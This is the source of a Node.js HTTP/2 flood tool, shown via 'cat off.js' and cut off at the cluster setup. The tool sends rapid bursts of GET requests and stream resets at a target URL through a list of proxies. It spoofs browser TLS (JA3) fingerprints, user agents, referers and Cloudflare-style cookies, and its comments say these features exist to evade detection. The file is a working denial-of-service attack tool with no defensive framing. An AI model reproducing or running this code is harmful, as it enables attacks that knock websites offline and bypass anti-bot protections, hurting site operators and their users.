```cat off.js
const fs = require('fs');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const crypto = require('crypto');
const os = require('os');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);
process.on('uncaughtException', (e) => { console.log(e) });
process.on('unhandledRejection', (e) => { console.log(e) });

const target = process.argv[2];
const time = parseInt(process.argv[3], 10);
const threads = parseInt(process.argv[4], 10);
const ratelimit = parseInt(process.argv[5], 10);
let proxies = [];
try {
    if (!process.argv[6]) {
        console.error('Error: Proxy file path not provided. Usage: node cf.js <target> <time> <threads> <ratelimit> <proxy_file>');
        process.exit(1);
    }
    proxies = fs.readFileSync(process.argv[6], 'utf8').replace(/\r/g, '').split('\n').filter(proxy => proxy.trim() && proxy.includes(':'));
    if (proxies.length === 0) {
        console.error('Error: No valid proxies found in the proxy file. Make sure the file contains proxies in format host:port');
        process.exit(1);
    }
    console.log(`Loaded ${proxies.length} proxies from ${process.argv[6]}`);
} catch (error) {
    console.error('Error reading proxy file:', error.message);
    process.exit(1);
}
const url = new URL(target);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

function generateRandomString(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomString = '';
    for (let i = 0; i < length; i++) {
        randomString += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return randomString;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let chr = 100;
let chr_2 = 101;
let minifix = false;

setInterval(() => {
    chr = generateRandomNumber(100, 135);
    chr_2 = generateRandomNumber(100, 135);
    minifix = !minifix
}, 1000);

function generateHeaders(url, streamId, type, statuses, version, ja3Config = null) {
    if (!ja3Config) {
        ja3Config = generateJA3Config();
    }

    const randomString = generateRandomString(10);
    let newpathname = url.pathname;
    const header = {};

    // 增强的UA生成函数 - 与JA3指纹完全匹配
    const generateDynamicUA = (browserType, browserVersion) => {
        // 根据JA3指纹生成对应的User-Agent
        const browserTemplates = {
            chrome: {
                getUA: (version, os) => {
                    const webkitVersion = '537.36';
                    return `Mozilla/5.0 (${os}) AppleWebKit/${webkitVersion} (KHTML, like Gecko) Chrome/${version} Safari/${webkitVersion}`;
                }
            },
            firefox: {
                getUA: (version, os) => {
                    const geckoVersion = '20100101';
                    return `Mozilla/5.0 (${os}; rv:${version}) Gecko/${geckoVersion} Firefox/${version}`;
                }
            },
            safari: {
                getUA: (version, os) => {
                    const webkitVersion = '605.1.15';
                    return `Mozilla/5.0 (${os}) AppleWebKit/${webkitVersion} (KHTML, like Gecko) Version/${version} Safari/${webkitVersion}`;
                }
            },
            edge: {
                getUA: (version, os) => {
                    const webkitVersion = '537.36';
                    const chromeVersion = version.split('.')[0] + '.0.0.0'; // 简化Chrome版本
                    return `Mozilla/5.0 (${os}) AppleWebKit/${webkitVersion} (KHTML, like Gecko) Chrome/${chromeVersion} Safari/${webkitVersion} Edg/${version}`;
                }
            }
        };

        // 操作系统模板 - 根据浏览器类型选择合适的操作系统
        const getOSString = (browserType) => {
            const osTemplates = {
                chrome: [
                    'Windows NT 10.0; Win64; x64',
                    'Windows NT 11.0; Win64; x64',
                    'Macintosh; Intel Mac OS X 10_15_7',
                    'X11; Linux x86_64'
                ],
                firefox: [
                    'Windows NT 10.0; Win64; x64; rv:109.0',
                    'Windows NT 11.0; Win64; x64; rv:109.0',
                    'Macintosh; Intel Mac OS X 10.15',
                    'X11; Linux x86_64'
                ],
                safari: [
                    'Macintosh; Intel Mac OS X 10_15_7',
                    'Macintosh; Intel Mac OS X 11_7_10',
                    'Macintosh; Intel Mac OS X 12_7_1'
                ],
                edge: [
                    'Windows NT 10.0; Win64; x64',
                    'Windows NT 11.0; Win64; x64',
                    'Macintosh; Intel Mac OS X 10_15_7'
                ]
            };

            const templates = osTemplates[browserType] || osTemplates.chrome;
            return templates[Math.floor(Math.random() * templates.length)];
        };

        // 获取浏览器模板和操作系统
        const template = browserTemplates[browserType.toLowerCase()];
        if (!template) {
            // 如果没有找到对应模板，默认使用Chrome
            return browserTemplates.chrome.getUA(browserVersion, getOSString('chrome'));
        }

        const osString = getOSString(browserType.toLowerCase());
        return template.getUA(browserVersion, osString);

    };

    // 使用与JA3指纹匹配的User-Agent
    const userAgent = generateDynamicUA(ja3Config.browser, ja3Config.version);

     // 集成反检测技术
     const cacheHeaders = AntiDetection.simulateCacheBehavior();
     const referer = AntiDetection.generateRefererChain(url.hostname);
     const privacyHeaders = AntiDetection.generatePrivacyHeaders();
     const acceptEncoding = AntiDetection.generateAcceptEncoding(ja3Config.browser);

    // 增强的平台检测
    let platform = "Unknown";
    const platformMap = {
        'Windows': 'Windows',
        'Macintosh': 'macOS',
        'iPhone': 'iOS',
        'iPad': 'iOS',
        'Android': 'Android',
        'Linux': 'Linux',
        'ChromeOS': 'ChromeOS',
        'Windows Phone': 'Windows Phone',
        'CrOS': 'ChromeOS'
    };

    for (const key in platformMap) {
        if (userAgent.includes(key)) {
            platform = platformMap[key];
            break;
        }
    }

    // 移动设备检测增强
    const isMobile = userAgent.includes('Mobile') ||
                    userAgent.includes('iPhone') ||
                    userAgent.includes('iPad') ||
                    userAgent.includes('Android') ||
                    userAgent.includes('Windows Phone') ||
                    userAgent.includes('SamsungBrowser') ||
                    userAgent.includes('UCBrowser');

    // 增强的语言生成
    const acceptLanguages = [
        `en-US,en;q=0.${generateRandomNumber(5, 9)}`,
        `en-GB,en;q=0.${generateRandomNumber(5, 9)}`,
        `${generateRandomString(2)}-${generateRandomString(2)},${generateRandomString(2)};q=0.9`,
        `de-DE,de;q=0.${generateRandomNumber(5, 9)}`,
        `fr-FR,fr;q=0.${generateRandomNumber(5, 9)}`,
        `es-ES,es;q=0.${generateRandomNumber(5, 9)}`,
        `ru-RU,ru;q=0.${generateRandomNumber(5, 9)}`,
        `ja-JP,ja;q=0.${generateRandomNumber(5, 9)}`,
        `zh-CN,zh;q=0.${generateRandomNumber(5, 9)}`,
        `ko-KR,ko;q=0.${generateRandomNumber(5, 9)}`,
        `it-IT,it;q=0.${generateRandomNumber(5, 9)}`,
        `nl-NL,nl;q=0.${generateRandomNumber(5, 9)}`,
        `pt-BR,pt;q=0.${generateRandomNumber(5, 9)}`,
        `sv-SE,sv;q=0.${generateRandomNumber(5, 9)}`,
        `pl-PL,pl;q=0.${generateRandomNumber(5, 9)}`,
        `ar-SA,ar;q=0.${generateRandomNumber(5, 9)}`
    ];

    const acceptLanguage = acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)];

    // 根据JA3指纹生成匹配的sec-ch-ua头部
    const generateSecChUa = (browserType, browserVersion) => {
        const majorVersion = browserVersion.split('.')[0];
        const notABrandVersion = generateRandomNumber(8, 99);

        switch(browserType.toLowerCase()) {
            case 'chrome':
                return `"Not_A Brand";v="${notABrandVersion}", "Google Chrome";v="${majorVersion}", "Chromium";v="${majorVersion}"`;
            case 'firefox':
                // Firefox 不使用 sec-ch-ua 头部
                return null;
            case 'safari':
                // Safari 不使用 sec-ch-ua 头部
                return null;
            case 'edge':
                return `"Not_A Brand";v="${notABrandVersion}", "Microsoft Edge";v="${majorVersion}", "Chromium";v="${majorVersion}"`;
            default:
                return `"Not_A Brand";v="${notABrandVersion}", "Google Chrome";v="${majorVersion}", "Chromium";v="${majorVersion}"`;
        }
    };

    const secChUaValue = generateSecChUa(ja3Config.browser, ja3Config.version);

    const secChUa = [
        `" Not A;Brand";v="${generateRandomNumber(5, 98)}", "Chromium";v="${generateRandomNumber(80, 100)}", "Google Chrome";v="${generateRandomNumber(80, 100)}"`,
        `" Not;A Brand";v="${generateRandomNumber(50, 99)}", "Microsoft Edge";v="${generateRandomNumber(80, 100)}"`,
        `" Not;A Brand";v="${generateRandomNumber(50, 99)}", "Brave";v="${generateRandomNumber(80, 100)}"`,
        `" Not;A Brand";v="${generateRandomNumber(50, 99)}", "Opera GX";v="${generateRandomNumber(70, 90)}"`,
        `" Not;A Brand";v="${generateRandomNumber(50, 99)}", "Vivaldi";v="${generateRandomNumber(4, 6)}"`,
        `" Not;A Brand";v="${generateRandomNumber(50, 99)}", "Yandex";v="${generateRandomNumber(21, 24)}"`,
        `" Not;A Brand";v="${generateRandomNumber(50, 99)}", "Samsung Browser";v="${generateRandomNumber(15, 20)}"`,
        `" Not;A Brand";v="${generateRandomNumber(50, 99)}", "UC Browser";v="${generateRandomNumber(13, 15)}"`
    ];

    if (streamId === 1) {
        header["pragma"] = "no-cache";
        header["cache-control"] = "no-cache";
    }
    if (secChUaValue) {
        header['sec-ch-ua'] = secChUaValue;
    }
    header['sec-ch-ua-mobile'] = isMobile ? "?1" : "?0";
    header['sec-ch-ua-platform'] = platform;
    header['upgrade-insecure-requests'] = "1";
    header['user-agent'] = userAgent;
    header['accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
    header['sec-fetch-site'] = "same-origin";

    const fetchModes = ["navigate", "no-cors", "cors", "same-origin"];
    header['sec-fetch-mode'] = fetchModes[Math.floor(Math.random() * fetchModes.length)];

    const fetchUsers = ["?1", "?0"];
    header['sec-fetch-user'] = fetchUsers[Math.floor(Math.random() * fetchUsers.length)];

    const fetchDests = ["document", "iframe", "image", "script", "style", "font", "manifest"];
    header['sec-fetch-dest'] = fetchDests[Math.floor(Math.random() * fetchDests.length)];

    // 使用反检测技术生成的头部
    header['accept-encoding'] = acceptEncoding;
    header['accept-language'] = acceptLanguage;
    header['priority'] = "u=0, i";

    // 使用真实的Referer或随机生成
    if (referer) {
        header['referer'] = referer;
    } else if (Math.random() > 0.5) {
        header['referer'] = `${randomString}:${randomString}/${randomString}.${randomString}:${randomString}.${randomString}-${randomString}`;
    }

    // 集成缓存头部
    Object.assign(header, cacheHeaders);

    // 集成隐私头部
    Object.assign(header, privacyHeaders);

    // 添加真实的浏览器特定头部
    if (ja3Config.browser === 'chrome' || ja3Config.browser === 'edge') {
        header['sec-ch-ua-arch'] = '"x86"';
        header['sec-ch-ua-bitness'] = '"64"';
        header['sec-ch-ua-full-version-list'] = `" Not A;Brand";v="${generateRandomNumber(5, 98)}.0.0.0", "Chromium";v="${ja3Config.version}", "Google Chrome";v="${ja3Config.version}"`;
    }

    // 模拟真实的连接头部
    if (Math.random() > 0.3) {
        header['connection'] = 'keep-alive';
    }

    return { header, newpathname };
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    const payload = data.subarray(9 + offset, 9 + offset + length);
    if (payload.length + offset != length) return null;
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

// JA3指纹数据库
const JA3_FINGERPRINTS = {
    chrome: {
        version: '120.0.6099.109',
        ja3: '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
        curves: 'X25519:P-256:P-384',
        extensions: [0, 23, 65281, 10, 11, 35, 16, 5, 13, 18, 51, 45, 43, 27, 17513],
        signatureAlgorithms: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
    },
    firefox: {
        version: '121.0',
        ja3: '771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-51-57-47-53,0-23-65281-10-11-35-16-5-51-43-13-45-28-21,29-23-24-25-256-257,0',
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:AES128-SHA:AES256-SHA',
        curves: 'X25519:P-256:P-384:P-521',
        extensions: [0, 23, 65281, 10, 11, 35, 16, 5, 51, 43, 13, 45, 28, 21],
        signatureAlgorithms: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512'
    },
    safari: {
        version: '17.2',
        ja3: '771,4865-4866-4867-49196-49195-52393-49200-49199-52392-49162-49161-49172-49171-157-156-53-47,65281-0-23-35-13-5-18-16-30032-10-12-27-17513,29-23-24-25,0',
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA:AES128-SHA',
        curves: 'X25519:P-256:P-384:P-521',
        extensions: [65281, 0, 23, 35, 13, 5, 18, 16, 30032, 10, 12, 27, 17513],
        signatureAlgorithms: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha384:rsa_pkcs1_sha512'
    },
    edge: {
        version: '120.0.2210.91',
        ja3: '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0',
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
        curves: 'X25519:P-256:P-384',
        extensions: [0, 23, 65281, 10, 11, 35, 16, 5, 13, 18, 51, 45, 43, 27, 17513, 21],
        signatureAlgorithms: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
    }
};

// 生成JA3配置
function generateJA3Config() {
    const browsers = Object.keys(JA3_FINGERPRINTS);
    const selectedBrowser = browsers[Math.floor(Math.random() * browsers.length)];
    const browserData = JA3_FINGERPRINTS[selectedBrowser];

    return {
        browser: selectedBrowser,
        version: browserData.version,
        ja3String: browserData.ja3,
        ciphers: browserData.ciphers,
        curves: browserData.curves,
        extensions: browserData.extensions,
        signatureAlgorithms: browserData.signatureAlgorithms
    };
}

// 高级反检测技术
const AntiDetection = {
    // 请求时序随机化 - 已删除以提升速度
    getRandomDelay: () => {
        return 0; // 完全移除延迟
    },

    // 立即执行回调，不添加任何延迟
    simulateFrameTiming: (callback) => {
        callback(); // 立即执行，无延迟
    },

    // 模拟真实浏览器的连接行为
    simulateConnectionBehavior: () => {
        return {
            keepAlive: Math.random() > 0.3, // 70%概率保持连接
            reuseConnection: Math.random() > 0.4, // 60%概率复用连接
            pipelining: Math.random() > 0.7, // 30%概率使用管道
        };
    },

    // 生成真实的请求模式
    generateRequestPattern: () => {
        const patterns = [
            { burst: 3, interval: 1000 }, // 突发3个请求，间隔1秒
            { burst: 1, interval: 500 },  // 单个请求，间隔0.5秒
            { burst: 2, interval: 750 },  // 2个请求，间隔0.75秒
            { burst: 5, interval: 1500 }, // 突发5个请求，间隔1.5秒
        ];
        return patterns[Math.floor(Math.random() * patterns.length)];
    },

    // 模拟浏览器缓存行为
    simulateCacheBehavior: () => {
        const cacheHeaders = {};
        if (Math.random() > 0.6) {
            cacheHeaders['if-none-match'] = `"${Math.random().toString(36).substr(2, 9)}"`;
        }
        if (Math.random() > 0.7) {
            cacheHeaders['if-modified-since'] = new Date(Date.now() - Math.random() * 86400000).toUTCString();
        }
        return cacheHeaders;
    },

    // 生成真实的Referer链
    generateRefererChain: (targetHost) => {
        const searchEngines = [
            'https://www.google.com/search?q=',
            'https://www.bing.com/search?q=',
            'https://duckduckgo.com/?q=',
            'https://search.yahoo.com/search?p='
        ];
        const socialMedia = [
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.linkedin.com/',
            'https://www.reddit.com/'
        ];

        const refererType = Math.random();
        if (refererType < 0.4) {
            // 搜索引擎来源
            const engine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
            return engine + encodeURIComponent(targetHost.replace(/^www\./, ''));
        } else if (refererType < 0.6) {
            // 社交媒体来源
            return socialMedia[Math.floor(Math.random() * socialMedia.length)];
        } else if (refererType < 0.8) {
            // 同域名来源
            return `https://${targetHost}/`;
        }
        // 20%概率无Referer
        return null;
    },

    // 模拟真实的Accept-Encoding
    generateAcceptEncoding: (browserType) => {
        const encodings = {
            chrome: 'gzip, deflate, br, zstd',
            firefox: 'gzip, deflate, br',
            safari: 'gzip, deflate, br',
            edge: 'gzip, deflate, br, zstd'
        };
        return encodings[browserType] || encodings.chrome;
    },

    // 生成真实的DNT和GPC头部
    generatePrivacyHeaders: () => {
        const headers = {};
        if (Math.random() > 0.7) {
            headers['dnt'] = '1'; // 30%概率启用DNT
        }
        if (Math.random() > 0.9) {
            headers['sec-gpc'] = '1'; // 10%概率启用GPC
        }
        return headers;
    },

    // 模拟真实的TLS握手行为
    generateTLSBehavior: () => {
        return {
            // 模拟会话恢复概率
            sessionResume: Math.random() > 0.4, // 60%概率尝试会话恢复
            // 模拟OCSP装订请求
            requestOCSP: Math.random() > 0.3, // 70%概率请求OCSP
            // 模拟SNI扩展
            enableSNI: Math.random() > 0.1, // 90%概率启用SNI
            // 模拟应用层协议协商
            alpnProtocols: Math.random() > 0.2 ? ['h2', 'http/1.1'] : ['http/1.1']
        };
    },

    // 生成无延迟的网络行为模式
    generateNetworkPattern: () => {
        const patterns = [
            { type: 'burst', requests: 5, interval: 0 }, // 增加请求数量，移除间隔
            { type: 'steady', requests: 3, interval: 0 },
            { type: 'mixed', requests: 4, interval: 0 },
            { type: 'aggressive', requests: 6, interval: 0 } // 更激进的模式
        ];
        return patterns[Math.floor(Math.random() * patterns.length)];
    },

    // 模拟浏览器指纹随机化
    randomizeBrowserFingerprint: (ja3Config) => {
        // 轻微随机化TLS参数以避免完全相同的指纹
        const variations = {
            cipherVariation: Math.random() > 0.8, // 20%概率轻微调整密码套件顺序
            extensionVariation: Math.random() > 0.9, // 10%概率调整扩展顺序
            curveVariation: Math.random() > 0.85 // 15%概率调整椭圆曲线顺序
        };
        return variations;
    }
};

function generateCiphers() {
    const ja3Config = generateJA3Config();
    return ja3Config.ciphers;
}

let version = 100;
let statuses = {};
const statusesQ = [];
let yasinpidora1 = 11111;
let yasinpidora4 = 22222;
let yasinpidora6 = 12121;

setInterval(() => version++, 3000);

async function startRequest() {
    if (!proxies || proxies.length === 0) {
        console.error('No proxies available or proxy file is empty');
        return;
    }

    const randomProxy = proxies[~~(Math.random() * proxies.length)];
    if (!randomProxy || !randomProxy.includes(':')) {
        console.error('Invalid proxy format:', randomProxy);
        return;
    }

    var [proxyHost, proxyPort] = randomProxy.split(':');
    let SocketTLS;

    try {
        var netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            // 获取TLS行为配置
            const tlsBehavior = AntiDetection.generateTLSBehavior();
            const ja3Config = generateJA3Config();
            const fingerprint = AntiDetection.randomizeBrowserFingerprint(ja3Config);

            const selectedProtocol = tlsBehavior.alpnProtocols[Math.floor(Math.random() * tlsBehavior.alpnProtocols.length)];
            const sessionId = tlsBehavior.sessionResume ? crypto.randomBytes(32) : crypto.randomBytes(64);

            // 生成更真实的密码套件
            let ciphers = generateCiphers();
            if (fingerprint.cipherVariation) {
                // 轻微调整密码套件顺序
                const cipherArray = ciphers.split(':');
                if (cipherArray.length > 2) {
                    const temp = cipherArray[0];
                    cipherArray[0] = cipherArray[1];
                    cipherArray[1] = temp;
                    ciphers = cipherArray.join(':');
                }
            }

            SocketTLS = tls.connect({
                socket: netSocket,
                ALPNProtocols: tlsBehavior.alpnProtocols,
                servername: tlsBehavior.enableSNI ? url.host : undefined,
                ciphers: ciphers,
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                session: sessionId,
                secure: true,
                rejectUnauthorized: false,
                sessionIdContext: `http2-client-${Math.random().toString(36).substr(2, 8)}`,
                checkServerIdentity: () => undefined,
                requestOCSP: tlsBehavior.requestOCSP
            }, async () => {
                let streamId = 1;
                let streamIdReset = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(15663105, 0);

                let custom_table = 65535;
                let custom_window = 6291455;
                let custom_header = 262144;

                yasinpidora1 += 1;
                yasinpidora4 += 1;
                yasinpidora6 += 1;

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...(Math.random() < 0.996 ? [[1, custom_table]] : [[1, yasinpidora1]]),
                        [2, 0],
                        ...(Math.random() < 0.996 ? [[4, custom_window]] : [[4, yasinpidora4]]),
                        ...(Math.random() < 0.996 ? [[6, custom_header]] : [[6, yasinpidora6]]),
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                SocketTLS.on('data', async (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                SocketTLS.write(encodeFrame(0, 4, "", 1));
                            }



                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];

                                if (status === 403) {
                                    SocketTLS.end();
                                }

                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }

                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (!statuses["GOAWAY"])
                                        statuses["GOAWAY"] = 0

                                    statuses["GOAWAY"]++
                                }
                                SocketTLS.end();
                            }
                        } else {
                            break;
                        }
                    }

                    // 移除网络间隔延迟，立即处理下一批次
                });

                SocketTLS.write(Buffer.concat(frames));

                if (SocketTLS && !SocketTLS.destroyed && SocketTLS.writable) {
                    // 获取JA3配置和网络行为模式
                    const ja3Config = generateJA3Config();
                    const networkPattern = AntiDetection.generateNetworkPattern();
                    const connectionBehavior = AntiDetection.simulateConnectionBehavior();

                    // 应用智能请求模式
                     const requestsToSend = Math.min(ratelimit, networkPattern.requests);

                     // 模拟连接重用行为
                     if (connectionBehavior.reuseConnection && Math.random() > 0.3) {
                         // 30%概率不重用连接，模拟真实浏览器行为
                     }

                     for (let i = 0; i < requestsToSend; i++) {
                        const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
                        const { header, newpathname } = generateHeaders(url, streamId, 0, statuses, version, ja3Config);

                        // 移除所有延迟，立即发送请求

                        const headers = Object.entries({
                            ':method': 'GET',
                            ':authority': url.hostname,
                            ':scheme': 'https',
                            ":path": `${newpathname}`,
                        }).concat(Object.entries({
                            ...header
                        }).filter(a => a[1] != null));

                        // 生成更真实的自定义头部
                        const generateRealisticHeaders = () => {
                            const realisticHeaders = {};

                            // 模拟真实的Cookie（更复杂的格式）
                            if (Math.random() < 0.7) {
                                const cookieNames = ['sessionid', 'csrftoken', '_ga', '_gid', 'auth_token', 'user_pref', '__cf_bm', '_cfuvid'];
                                const cookieName = cookieNames[Math.floor(Math.random() * cookieNames.length)];
                                const cookieValue = cookieName.startsWith('_ga') ?
                                    `GA1.2.${Math.floor(Math.random() * 1000000000)}.${Math.floor(Date.now() / 1000)}` :
                                    randomString + Math.random().toString(36).substr(2, 8);
                                realisticHeaders['cookie'] = `${cookieName}=${cookieValue}; Path=/; Secure`;
                            }

                            // 模拟真实的浏览器特征头部
                            if (Math.random() < 0.3) {
                                realisticHeaders['sec-fetch-dest'] = ['document', 'empty', 'script'][Math.floor(Math.random() * 3)];
                            }

                            // 模拟WebRTC和媒体相关头部
                            if (Math.random() < 0.2) {
                                realisticHeaders['x-client-data'] = Buffer.from(JSON.stringify({
                                    timestamp: Date.now(),
                                    screen: `${1920 + Math.floor(Math.random() * 400)}x${1080 + Math.floor(Math.random() * 300)}`,
                                    timezone: Math.floor(Math.random() * 24) - 12
                                })).toString('base64');
                            }

                            // 模拟真实的性能监控头部
                            if (Math.random() < 0.15) {
                                realisticHeaders['x-performance-timing'] = `${Math.floor(Math.random() * 100)},${Math.floor(Math.random() * 50)}`;
                            }

                            return realisticHeaders;
                        };

                        const headers2 = Object.entries(generateRealisticHeaders()).filter(a => a[1] != null);

                        // 随机化头部顺序以避免检测
                        let combinedHeaders = headers.concat(headers2);

                        // 保持伪头部(:method, :authority等)在前面，但随机化其他头部
                        const pseudoHeaders = combinedHeaders.filter(([name]) => name.startsWith(':'));
                        const regularHeaders = combinedHeaders.filter(([name]) => !name.startsWith(':'));

                        // 随机打乱常规头部顺序
                        for (let i = regularHeaders.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [regularHeaders[i], regularHeaders[j]] = [regularHeaders[j], regularHeaders[i]];
                        }

                        combinedHeaders = pseudoHeaders.concat(regularHeaders);

                        if (selectedProtocol === 'h2') {
                            let packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(combinedHeaders)
                            ]);

                            // 应用帧时序模拟
                            AntiDetection.simulateFrameTiming(() => {
                                SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                            });

                            if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                AntiDetection.simulateFrameTiming(() => {
                                    SocketTLS.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                                });
                            }

                            streamIdReset += 2;
                            streamId += 2;
                        } else {
                            const headerLines = headers.map(([name, value]) => `${name}: ${value}`).join('\r\n');
                            const request = `GET ${newpathname} HTTP/1.1\r\n${headerLines}\r\n\r\n`;
                            SocketTLS.write(request);
                        }
                    }
                }
            });

            SocketTLS.on('error', (error) => cleanup(error));
            SocketTLS.on('close', () => cleanup());
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', (error) => {
        cleanup();
    });
    netSocket.on('close', () => {
        cleanup();
    });

    function cleanup(error) {
        if (error) {
            //console.log('Error during cleanup:', error);
        }
        if (netSocket) {
            netSocket.destroy();
            netSocket = null;
        }
        if (SocketTLS) {
            SocketTLS.end();
            SocketTLS = null;
        }
    }
    } catch (e) {
        // 静默捕获端口错误
    }
}

if (cluster.isMaster) {
    const workers = {};
